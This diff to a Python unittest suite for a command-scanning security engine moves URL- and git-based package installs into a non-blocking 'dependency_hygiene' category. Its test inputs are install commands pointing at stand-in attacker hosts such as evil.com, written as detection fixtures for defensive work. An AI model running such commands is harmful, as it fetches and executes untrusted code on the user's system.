@@ -278,25 +278,30 @@ class TestSupplyChainRules(unittest.TestCase):
 
     # ── Package install interception ──────────────────────────────────
 
+    # Install-from-url/git is supply-chain HYGIENE (warn), not a hard block:
+    # these rules live under the non-blocking `dependency_hygiene` category so a
+    # routine `pip install git+https://…` isn't hard-stopped in enforce mode.
+    # Genuine THREATS (typosquat, dependency-confusion, OSV-vulnerable pins)
+    # stay under `dependency_risk` and block.
     def test_pip_install_from_url(self):
         findings = self.engine.check_command("pip install https://evil.com/pkg.tar.gz")
         categories = [f["category"] for f in findings]
-        self.assertIn("dependency_risk", categories)
+        self.assertIn("dependency_hygiene", categories)
 
     def test_npm_install_from_git(self):
         findings = self.engine.check_command("npm install git+https://github.com/evil/pkg")
         categories = [f["category"] for f in findings]
-        self.assertIn("dependency_risk", categories)
+        self.assertIn("dependency_hygiene", categories)
 
     def test_yarn_add_from_url(self):
         findings = self.engine.check_command("yarn add https://evil.com/pkg.tgz")
         categories = [f["category"] for f in findings]
-        self.assertIn("dependency_risk", categories)
+        self.assertIn("dependency_hygiene", categories)
 
     def test_cargo_install_from_git(self):
         findings = self.engine.check_command("cargo install --git https://github.com/evil/pkg")
         categories = [f["category"] for f in findings]
-        self.assertIn("dependency_risk", categories)
+        self.assertIn("dependency_hygiene", categories)
 
     def test_pip_install_normal_not_flagged(self):
         findings = self.engine.check_command("pip install requests")
